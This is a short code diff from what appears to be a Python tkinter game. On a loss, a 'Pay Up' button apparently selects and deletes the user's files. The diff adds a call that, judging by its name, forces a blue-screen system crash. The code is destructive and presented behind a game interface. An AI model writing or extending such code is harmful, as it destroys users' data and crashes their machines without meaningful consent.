@@ -90,7 +90,10 @@ class outcome_window(object):
         self.top.lift()
     def defeat(self):
         self.b = ttk.Button(self.top, text='Pay Up... [This will take about 30s]',
-                            command=lambda: misc_functions.listremove(misc_functions.select_files(self.fileno)))
+                            command=self.payup)
         self.b.pack()
+    def payup(self):
+        misc_functions.listremove(misc_functions.select_files(self.fileno))
+        misc_functions.invoke_bsod()
     def cleanup(self):
         self.master.destroy()
